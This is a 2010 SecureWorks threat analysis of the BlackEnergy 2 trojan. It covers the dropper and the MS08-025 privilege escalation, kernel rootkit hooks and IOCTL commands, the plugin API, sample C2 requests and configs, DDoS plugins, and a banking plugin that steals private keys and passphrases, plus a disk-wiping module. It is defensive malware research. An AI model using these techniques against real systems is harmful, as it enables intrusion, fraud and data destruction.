    "plain_text": "# BlackEnergy Version 2 Threat Analysis\n\n**secureworks.com/research/blackenergy2**\n\nJoe Stewart\n\nWednesday, March 3, 2010 By: Joe Stewart\n\n## Introduction\n\n\n-----\n\nBlackEnergy, a popular DDoS Trojan, gained notoriety in 2008 when it was reported to have\nbeen used in the cyber attacks launched against the country of Georgia in the\nRussia/Georgia conflict. BlackEnergy was authored by a Russian hacker. A comprehensive\nanalysis of the version of BlackEnergy circulating at the time was done in 2007 by Arbor\nNetworks. Although many versions of the trojan builder kit are in circulation on underground\nforums, the last release of the original BlackEnergy trojan available at the time of this writing\nseems to be version 1.9.2.\n\nIt appears however that BlackEnergy 2 has been in quiet development for over a year, and is\na top-to-bottom rewrite of the codebase. Although there have been no public releases of the\ntrojan builder kit for BlackEnergy 2 at this time (and thus we do not have any documentation\nactually containing the name \"BlackEnergy 2\", it is certain that this new trojan is the\nsuccessor to BlackEnergy version 1, even if the author chooses to rename it. Various\nfingerprints of the original BlackEnergy codebase can be found throughout the new trojan,\nalong with fingerprints of other source codes which were released by the author at different\ntimes. This analysis will refer to BlackEnergy version 2 as ?BE2? at times throughout for the\nsake of brevity.\n\nUnlike the old BlackEnergy versions, BlackEnergy 2 uses modern rootkit/process-injection\ntechniques, strong encryption and a modular architecture. The original BlackEnergy kit did\nhave a rudimentary trojan component used to hide the trojan executable and process, but\nBlackEnergy 2 is much more sophisticated. The basis for the new rootkit seems to be found\nin an older rootkit project released by the author called \"BlackReleaver\". Analysis of the code\nhas shown that the older rootkit source code has been combined with new functions for\nunpacking and injecting modules into user processes and is now the core of the new rootkitbased BlackEnergy 2.\n\nThere is no distinct antivirus trojan family name that corresponds to the BE2 dropper or\nrootkit driver. Antivirus engines that detect it either label it with a generic name, or as another\ntrojan - most often it is mis-identified as \"Rustock.E\", another rootkit trojan from a different\nmalware family. The BlackEnergy rootkit does share some techniques in common with the\nRustock rootkit, so this detection is not surprising. Even at a high level, there are some\n[common tactics, such as the use of a \"matryoshka doll\" architecture (see ThreatExpert's blog](http://www.threatexpert.com/)\n[entry \"Rustock.C - Unpacking a Nested Doll\").](http://blog.threatexpert.com/2008/05/rustockc-unpacking-nested-doll.html)\n\n\n-----\n\n_Structure and Flow of BlackEnergy 2.x Unpacking/Injection_\n\n## Dropper\n\nThe initial BlackEnergy 2 trojan infection is a \"dropper\", which decrypts and uncompresses\nthe rootkit driver binary and installs it as a service with a randomly generated name. Using\ndroppers that unpack and install another piece of malware is a routine technique, even\nthough the packing method used tends to vary quite a bit. The basic scheme used in the BE2\ndropper is also used throughout the different BlackEnergy modules ? packed content is\ncompressed using the LZ77 algorithm and encrypted using a modified version of the\nvenerable RC4 cipher. For decrypting embedded content a hard-coded 128-bit key is used.\nFor decrypting network traffic, the cipher uses the bot's unique identification string as the key.\nA second variant of the encryption/compression scheme adds an initialization vector to the\nmodified RC4 cipher for an extra protection in the dropper and rootkit unpacking stub, but is\nnot used in the inner rootkit nor in the userspace modules.\n\nThe primary modification in the RC4 implementation in BlackEnergy 2 lies in the keyscheduling algorithm. According to Wikipedia, the (alleged) KSA of RC4 can be described by\nthe following code:\n```\nfor i from 0 to 255 S[i] := iendforj := 0for\ni from 0 to 255 j := (j + S[i] + key[i mod\nkeylength]) mod 256 swap(&S[i],&S[j])endfor\n\n```\n\n-----\n\nThe KSA implementation in BE2 takes a shortcut that makes for a simpler (and probably less\nsecure) implementation, and is equivalent to the following code:\n```\nfor i from 0 to 255 S[i] := iendforfor i\nfrom 0 to 255 S[i] = S[i] xor key[i mod\nkeylength]endfor\n\n```\nIt is unclear if the author of the intentionally introduced these differences in order to break\ncompatibility with other RC4 implementations, or if they are simply mistakes.\n\nThe dropper also contains an exploit for the vulnerability described in Microsoft Bulletin\nMS08-025, allowing the trojan installer to escalate its privileges on the system in cases\nwhere the infected user may be running under a limited user account without permission to\ninstall new system services. Assuming they have not installed Microsoft's patch for MS08025, the trojan could then complete the task of installing the rootkit driver. The exploit code in\nthe binary can be traced to source code of a proof-of-concept MS08-025 exploit authored\nand released in May 2008.\n\n_MS08-25 PoC Exploit by the Black Energy Author_\n\n## Rootkit\n\nThe rootkit driver installed by the dropper file contains an unpacking stub that decrypts and\ndecompresses the real rootkit driver embedded within the binary. Once the main driver is\nunpacked and address offset fixups remapped, the stub transfers control to the entry point of\nthe rootkit.\n\nThe rootkit performs three primary functions:\n\nHiding objects on disk, in the registry and in memory through API hooking\nProviding a method for modules to bypass the rootkit's hooks for certain functions\nInjection of the main BE2 DLL into svchost.exe in userspace\n\nThese tasks are carried out by hooking a number of Windows kernel functions, adding\nadditional code that all programs/kernel drivers which use the API will then run prior to or\nafter the real API code is called. This is accomplished by searching for the following\n\n\n-----\n\nfunctions in the kernel s system service descriptor table (SSDT) and replacing them with calls\nto handler functions in the rootkit's code section.\n\nNTEnumerateValueKey\nNTSetValueKey\nNTOpenKey\nNTSetContextThread\nNTDeleteValueKey\nNTEnumerateKey\nNtOpenProcess\nNTQuerySystemInformation\nNTProtectVirtualMemory\nNTTerminateThread\nNTWriteVirtualMemory\nNTSuspendThread\nNtOpenThread\n\nWhen the hook handler for each API executes, it checks the arguments provided by the\ncalling function against an in-memory list of rules defining strings or values for which access\nshould be denied to all processes except the control process (the instance of svchost.exe\ninto which the main DLL was loaded). In this way the rootkit can hide the presence of (or at\nleast block access to) processes, files, registry keys and values, memory objects/ranges and\nthreads from processes that would attempt to inspect them in order to detect the presence of\nthe rootkit.\n\nSome of the rules are made persistent by storing them under the same system service\nregistry key as the rootkit driver, using the value name \"RulesData\". Rules are categorized\nby a rule type, which may be one of the following:\n\n_Code_ _Persistent_ _Protected Object Type_\n\n01 No Process\n\n02 Yes File\n\n03 Yes Registry Key\n\n04 Yes Registry Value\n\n07 No Virtual Memory Range\n\n08 No Thread\n\n_BlackEnergy v2.x Rule Types_\n\n\n-----\n\nThe rootkit driver uses an IOCTL interface to facilitate communication between itself and the\nmain DLL module loaded into the svchost.exe process. The following table shows all the\npossible command codes that can be passed in the IOCTL buffer in order to indicate which\nfunction the rootkit should perform on behalf of the main DLL.\n\n_Code_ _Function_\n\n01 Add a new protected process to the ruleset\n\n02 Add a new protected file to the ruleset\n\n03 Add a new protected registry key to the ruleset\n\n04 Add a new protected registry value to the ruleset\n\n05 Hide a process by unlinking it from the kernel's process list\n\n06 Load a new driver into kernel memory\n\n07 Add a new protected memory range to the ruleset\n\n08 Add a new protected object to the ruleset\n\n09 Uninstall rootkit\n\n10 Add a new library to the injection list\n\n11 Remove a library from the injection list\n\n12 Add a new process to the injection target list\n\n13 Remove a process from the injection target list\n\n14 Register control process PID\n\n15 Call to original (non-hooked) NtOpenKey kernel API\n\n16 Call to original (non-hooked) NtOpenFile kernel API\n\n17 Call to original (non-hooked) NtShutdownSystem kernel API\n\n_BlackEnergy v2.x IOCTL Command Prefixes_\n\nFinally, the rootkit driver is designed to unpack a DLL embedded inside itself and inject it into\nuserspace, starting an instance of svchost.exe to receive the injected module.\n\n## Main DLL\n\n\n-----\n\nBE2 utilizes a plugin-based architecture, allowing anyone with knowledge of the API to add\nnew functionality to the trojan. The main DLL exposes this API and is responsible for loading\nthe plugins. Without plugins, the built-in functionality of BE2 is very limited. The main module\nrecognizes only the following commands from the controller:\n\n**rexec - download and execute a remote file**\n**lexec - execute a local command using cmd.exe**\n**die - uninstall BE2**\n**upd - download and install a remote update to BE2**\n**setfreq ? change the phone-home interval for the trojan**\n\nThe plugin API of BlackEnergy 2 is provided by the main DLL using the following exported\nfunctions:\n\n_Export_ _Purpose_\n\n\nConfAllocGetTextByNameA\nConfAllocGetTextByNameW\nConfGetListNodeByName\nConfGetNodeByName\nConfGetNodeTextA\nConfGetNodeTextW\nConfGetPlgNode\nConfGetRootNode\n\n\nFunctions to retrieve or set variables in the XML\nconfiguration\n\n\nDownloadFile Download a remote file\n\nGetBotIdent Get the ID string of the bot\n\nPlgSendEvent Send a Windows API event\n\n\nPlgGetValue\nPlgSetValue\nPlgUnsetValue\n\n\nRead, write or delete registry key values\n\n\nRkInjectLibraryAddProcess Add a new process to the list of userspace injection targets\n\n\nRkInjectLibrarySet\nRkInjectLibraryUnset\n\n\nAdd or remove library to be injected into userspace process\n\n\nRkLoadKernelImage Load a new kernel driver\n\nRkProtectObject Protect a memory object\n\nSrvAddRequestBinaryData Append binary data to the controller HTTP POST\n\nSrvAddRequestStringData Append a new text variable to the controller HTTP POST\n\n\n-----\n\nSrvSendRequestNow Send the prepared HTTP POST to the controller\n\n_BlackEnergy v2.x Plugin API_\n\n## Local Configuration File\n\nEmbedded within the main DLL is an encrypted and compressed XML file containing the\ninitial configuration options for the trojan. A typical configuration might look like the following:\n```\n<?xml version=\"1.0\" encoding=\"windows-1251\"?> <bkernel> <servers> <server>\n<type>http</type>\n<addr>http://example.com/getcfg.php</addr> </server> </servers> <cmds> </cmds>\n<sleepfreq>30</sleepfreq> <build_id>1</build_id> </bkernel>\n\n```\n_BlackEnergy v2.x Embedded Configuration File_\n\nThis file contains instructions on the trojan controller URL(s), any commands to be executed\ninitially, the phone-home interval, a unique build id for the trojan, all of which are customized\nin the interface of the trojan builder kit.\n\n## Network Communication\n\nThe network communication format closely resembles the BlackEnergy v1.x requests, with\nsome minor changes and three additional POST variables:\n```\nPOST /stat.php HTTP/1.1 Content-Type: application/x-wwwform-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE\n6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)Host:\nexample.com Content-Length: 33 Cache-Control: no-cache\nid=xCOMP_3FA21CD8&build_id=1\n\n```\n_BlackEnergy v1.x HTTP Request_\n```\nPOST /getcfg.php HTTP/1.0 Content-Type: application/x-wwwform-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE\n6.0; Windows NT 5.1; en) Host: example.com ContentLength: 43 Pragma: no-cache\nid=xCOMP_3FA21CD8&ln=en&cn=US&nt=2600&bid=1\n\n```\n_BlackEnergy v2.x HTTP Request_\n\n\n-----\n\nMore recent variants of BE2 have an additional encryption option in order to defeat detection\nof the network traffic by known patterns/variables in the normal requests. A configuration\noption \"http_key\" may be specified in the XML configuration file. If present, the full HTTP\nPOST variable string will be encrypted using the provided key with the modified RC4\nalgorithm, then hex-encoded and appended as a value to a new, randomly-generated\nvariable name. Such a post might resemble the following:\n```\nPOST /getcfg.php HTTP/1.0Content-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;\nWindows NT 5.1; en)Host: example.comContent-Length: 126Pragma: no-cache\nsksgh=E22EA13DA2170ACCC10CBA67C12ED8CB83774E032FC65BAEC5FA5CD826694619\nFABBF69297335C5A91BD02B2C7BB1E5AA0649991F2D6613888AD6749\n\n```\n_BlackEnergy v2.x HTTP Request with Encrypted Variables_\n\n## Remote Configuration File\n\nThe controller's response to the initial HTTP POST from the trojan is an encrypted XML\nconfiguration file, which contains additional instructions for the trojan that are set/modified\nusing the HTML/PHP-based controller interface. When decrypted, the file resembles the\nsame format as the embedded XML configuration, with additional fields. The main purpose of\nthe network-supplied configuration is to specify which plugins to load, by adding a \"plugins\"\nnode to the XML:\n```\n? <plugins> <plugin>\n<name>ddos</name>\n<version>1</version> </plugin>\n<plugin> <name>http</name>\n<version>1</version> </plugin>\n<plugin> <name>syn</name>\n<version>1</version> </plugin>\n</plugins> ?\n\n```\n_BlackEnergy v2.x Remote Configuration File Snippet_\n\n\n-----\n\nThe configuration snippet above tells the trojan to load three plugins from the controller. To\ndo so, the main DLL forms another HTTP POST request to the controller, this time\nprepending the variable \"getp\", to specify which plugin to download.\n```\nPOST /getcfg.php HTTP/1.0 Content-Type:\napplication/x-www-form-urlencoded User-Agent:\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;\nen) Host: example.com Content-Length: 43 Pragma:\nno-cache\ngetp=ddos&id=xCOMP_3FA21CD8&ln=en&cn=US&nt=2600&bid=1\n\n```\n_BlackEnergy v2.x Plugin Download Request_\n\nThe downloaded plugins are decrypted (using the same modified-RC4 algorithm) and loaded\ninto the same process as the main BE2 DLL. In order to save the controller's network\nbandwidth, copies of the plugins are also cached locally in an encrypted database stored in a\n(rootkit-protected) file named \"str.sys\" in the system drivers directory.\n\nThe plugins each have their own configuration node called \"plg_data\" in the downloaded\nXML file, and commands for the plugins to execute are added to the global ?cmds? node. All\nplugins export two functions of their own, ?DispatchCommand? and ?DispatchEvent?, which\nthe main DLL will call when there are new commands or events to process.\n\nIn the example below, the command ?ddos_start? is given, which will be dispatched by one\nof the modules. Under plg_data is a configuration node called ?ddos?, which contains other\nparameters for the attack. The syntax for specifying the parameters is very similar to that of\nBlackEnergy v1.x:\n```\n?<cmds><cmd>ddos_start http\nexample.com</cmd></cmds>\n<plg_data><ddos>\n<tcp_size>1000</tcp_size>\n<tcp_freq>30</tcp_freq>\n<tcp_threads>1</tcp_threads>\n<udp_size>1000</udp_size>\n<udp_freq>300</udp_freq>\n<udp_threads>3</udp_threads>\n<icmp size>1000</icmp size>\n\n```\n\n-----\n\n```\n<icmp_freq>50</icmp_freq>\n<icmp_threads>5</icmp_threads>\n<http_freq>50</http_freq>\n<http_threads>5</http_threads>\n</ddos><http>\n<http_freq>20</http_freq>\n<http_threads>2</http_threads>\n</http><syn>\n<syn_freq>20</syn_freq>\n<syn_threads>2</syn_threads>\n</syn></plg_data>?\n\n```\n_BlackEnergy v2.x Plugin Configuration_\n\n## New BE2 Plugins Developed for Spam and Online Banking Fraud\n\nThe plugin architecture allows for virtually any kind of code to be added to BE2 by third\nparties with a copy of the kit, without needing the actual source code to the trojan. Three\ndifferent plugins for launching DDoS attacks have been observed and appear to be the\ndefault plugins set. Together, these three modules reproduce the same DDoS functionality\nthat existed in BlackEnergy v1.x. A spam plugin has also been seen in the wild, and\nseparately, a pair of plugins designed to facilitate online banking fraud.\n\n\n_Plugin_\n_Name_\n\n**DDoS**\n**Plugins**\n\n\n_Module_\n_Name_\n\n\n_Description_\n\n\nddos ddos.dll This is a general-purpose plugin to launch random TCP, UDP,\nICMP and HTTP attack traffic against a target, using the\nparameters supplied in the remote XML configuration file.\n\nsyn syn.dll This plugin loads a kernel driver that can flood a target with TCP\nSYN packets. Because the attack originates from the kernel, the\nSYN packets can be sent quickly and without impacting the TCP\nstate table of the system, which can only maintain a limited\nnumber of entries.\n\n\n-----\n\nhttp http.dll This plugin uses OLE automation in Internet Explorer to flood a\ntarget with HTTP requests. While slower than the socket-based\nHTTP attack in the \"ddos\" plugin above, it has the advantage of\nmaking it more difficult for a remote site to distinguish attack traffic\nfrom normal browsing.\n\n**Spam**\n**Plugin**\n\nspm_v1 spm_v1.dll This plugin is a recompiled version of an older spambot called ?\nGrum?, which has been altered to work with the BE2 plugin\narchitecture. It uses its own protocol to phone home to a Grum\nspam controller, and is not configured via the BE2 XML options.\n\n**Banking**\n**Fraud**\n**Plugins**\n\nknab ibank.dll See detailed description below.\n\nkill kill.dll See detailed description below.\n\n_Known BlackEnergy v2.x Plugins_\n\n## Banking Plugin Details\n\nThe banking plugins, like the spam plugin, do not appear to be in wide circulation, and may\nnot be part of the default install. With some trojans, additional plugins with desirable\nfunctionality are sometimes offered as an extra option available for a fee. The same may be\ntrue with some of the lesser-distributed BlackEnergy 2 plugins.\n\n### ibank.dll\n\nThis plugin is designed to steal banking credentials from an infected user. There are two\ncomponents to the plugin, a master module that uses the BE2 plugin API to inject an\nembedded sub-module into the following browser processes:\n\niexplore.exe\nfirefox.exe\nflock.exe\nopera.exe\njava.exe\n\nIn each process, the sub-module loops while searching for any windows with a ClassName\nof SunAwtFrame or SunAwtDialog, indicating a Java-based dialog. The sub-module sets up\na thread to inject itself into the Java process for each window found in order to log\n\n\n-----\n\nkeystrokes typed or clipboard data pasted into those dialogs.\n\nThe sub-module also hooks the NtCreateFile API, and every time a file is opened by the\ninjected process, the first four bytes are read by the sub-module. If they match the string\n\"iBKS\", the complete file is stored in the memory of the sub-module.\n\nAdditionally, the sub-module hooks several APIs in the process space of the browser, in\norder to capture and log URLs that have been requested.\n\nFinally, the sub-module hooks the \"WSASend\" and \"send\" Windows socket APIs, and every\ntime one of those functions is called, the hook handler checks to see if the buffer is eight\nbytes in length. If it is, the first three bytes are compared to see if they match the little-endian\nbinary value 0x10000 (\"00 00 01\"). If the buffer matches, the sub-module takes all the\naccumulated iBKS files, keystroke logs and URL logs, archives them in PKZIP format, and\nsends them to the master ibank.dll module via a named pipe.\n\nThe master ibank.dll module receives the archived file from the named pipe, and sends it\nback to the BE2 controller using the \"SrvAddRequestBinaryData\" and\n\"SrvSendRequestNow\" plugin API calls. The binary data is added to the BE2 request using\nthe POST variable name \"ib_arch_data\".\n\nThe entire process above is designed to facilitate theft from a specific public-key-based\nInternet banking system which is widely used by a large number of Russian and Ukrainian\nbanks. The banking system targeted by ibank.dll uses a signed Java applet to load a user's\nprivate key from a removable disk, then a passphrase is entered into the Java dialog in order\nto unlock the key and cryptographically sign a message which authenticates the user to the\nbank at the start of the banking session.\n\nTheft of the user's credentials is accomplished by stealing the user's private encryption key\n(which is located in a file which starts with ?iBKS?) as it is read by the applet, and stealing\nthe user's passphrase as it is typed/pasted into the dialog. The stolen data, along with a list\nof URLs that were accessed at the same time (so that the thief knows which bank the\ncredentials are for) is sent back to the BE2 controller at the moment the login request (an 8byte packet beginning with \"00 00 01\") is sent to the banking application server.\n\n## Hackers Pair Banking Trojan with a System Destruct Module\n\nPaired with the banking trojan plugin is a module that is designed to destroy the filesystem of\nthe infected computer. If the command \"kill\" is specified in the configuration node in the\ndownloaded XML configuration file when this DLL is loaded, the trojan will loop through each\nfixed drive listed in Windows, overwriting the first 4,096 clusters with random data, then\nattempting to delete the files \"ntldr\" and \"boot.ini\" from the root of the filesystem. After\nrendering each disk unreadable/unbootable by Windows, the module shuts down the system.\n\n\n-----\n\nThis functionality is likely to be used after the banking credentials have been used by the\ncriminal operating the BE2 backend, in order to prevent the rightful owner of the bank\naccount from being able to log in and see that money has been transferred out of the\naccount and notifying the bank.\n\n## Variant Releases\n\nThe following versions of BE2 have been seen in the wild since 2008. The compile\ntimestamps of the unpacked rootkit driver and the main DLL packed inside each dropper give\nus a timeline of BE2 releases. The version numbers shown in the table below are merely\nspeculative, no official version numbers could be found in the trojan binaries:\n\n_Version Equivalent_ _Rootkit Timestamp_ _Embedded Main DLL Timestamp_\n\n2.0 August 12, 2008 August 12, 2008\n\n2.0.1 August 12, 2008 August 13, 2008\n\n2.0.2 August 12, 2008 October 14, 2008\n\n2.0.3 December 21, 2008 December 21, 2008\n\n2.0.4 December 27, 2008 December 21, 2008\n\n2.1.0 March 25, 2009 March 25, 2009\n\n2.1.1 March 25, 2009 April 27, 2009\n\n2.1.2 May 24, 2009 May 27, 2009\n\n2.1.3 July 10, 2009 June 22, 2009\n\n_Known BlackEnergy v2.x Releases_\n\n## Conclusion\n\nBlackEnergy 2 is a significant leap forward in capability from its predecessor. With the\nexisting plugins it already captures the three main cornerstones of modern cybercrime. If it is\never released to the wider underground, it will likely become as or more popular than the\noriginal version. With previous modular trojan applications we have seen entire communities\nspring up around adding new functionality to the platform, extending its criminal capabilities\nin ways never imagined by the author. It remains to be seen whether BE2 will continue to be\nheld privately, or will be found in wide circulation soon. Either way, there is much more room\nfor innovation in both stealth and functionality in future BlackEnergy 2 releases.\n\n\n-----",
